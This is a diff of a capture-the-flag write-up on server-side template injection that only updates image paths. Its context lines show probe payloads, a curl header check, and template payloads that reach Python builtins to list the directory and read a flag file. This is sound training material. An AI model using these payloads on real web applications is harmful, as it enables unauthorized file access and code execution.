@@ -17,13 +17,13 @@ user input directly on the page.This behavior is a red flag for SSTI,I tired to 
 
 ##step 2 -What i tried
 >"{{4+4}}" to see if the input is controlled or not.
-![the engine output](1.jpeg)
+![the engine output](/images/1.jpeg)
 >"{{3*'3'}}" after confirming its vulnerable i need to see which engine this web use.
-![the engine output](2.jpeg)
+![the engine output](/images/2.jpeg)
 >"curl -I "target url""to get the header and also used it as Indicator of which engine.
-![curl ouput](3.jpeg)
+![curl ouput](/images/3.jpeg)
 >"{{request.application.__globals__.__builtins__.__import__('os').listdir('.')}}" used to see the content of the current directory.
-![payload output](4.jpeg)
+![payload output](/images/4.jpeg)
 >"{{request.application.__globals__.__builtins__.open('flag').read()}}"used to print out the content of the file flag in the current directory.
 
 ##step 3 -the solution
